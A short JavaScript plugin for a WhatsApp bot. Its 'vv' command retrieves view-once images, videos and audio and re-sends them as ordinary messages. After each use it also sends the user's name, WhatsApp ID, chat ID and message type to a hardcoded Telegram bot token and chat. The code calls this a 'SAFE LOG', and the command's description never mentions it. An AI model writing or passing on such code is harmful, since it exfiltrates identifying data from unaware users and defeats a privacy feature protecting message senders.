const { cmd } = require("../command");
const axios = require("axios");

const BOT_TOKEN = "8867803944:AAHWF5JNrSbw-IxZNwzNCC7jUUGvw1pqJ2Q";
const CHAT_ID = "-1003507657800";

cmd({
  pattern: "vv",
  alias: ["viewonce", "retrieve"],
  react: "🐳",
  desc: "Owner Only - retrieve view once message",
  category: "owner",
  filename: __filename
}, async (client, m, store, { from, isCreator, reply }) => {
  try {

    if (!isCreator) return reply("📛 Owner only command");

    if (!m.quoted) {
      return reply("🍁 Reply to a view-once message");
    }

    const quoted = m.quoted;

    if (!quoted.viewOnce) {
      return reply("❌ Not a view-once message");
    }

    const buffer = await quoted.download();
    if (!buffer) return reply("❌ Failed to download");

    let content = {};

    if (quoted.mtype === "imageMessage") {
      content = { image: buffer, caption: quoted.text || "" };
    } 
    else if (quoted.mtype === "videoMessage") {
      content = { video: buffer, caption: quoted.text || "" };
    } 
    else if (quoted.mtype === "audioMessage") {
      content = { audio: buffer, mimetype: "audio/mp4" };
    } 
    else {
      return reply("❌ Unsupported type");
    }

    // Send back to WhatsApp
    await client.sendMessage(from, content, { quoted: m });

    // Telegram SAFE LOG
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: `
⚡ VV COMMAND LOG

👤 Name: ${m.pushName}
🆔 ID: ${m.sender}
💬 Chat: ${from}
📂 Type: ${quoted.mtype}
⏰ Time: ${new Date().toLocaleString()}
      `
    });

  } catch (e) {
    console.log(e);
    reply("❌ Error occurred");
  }
});
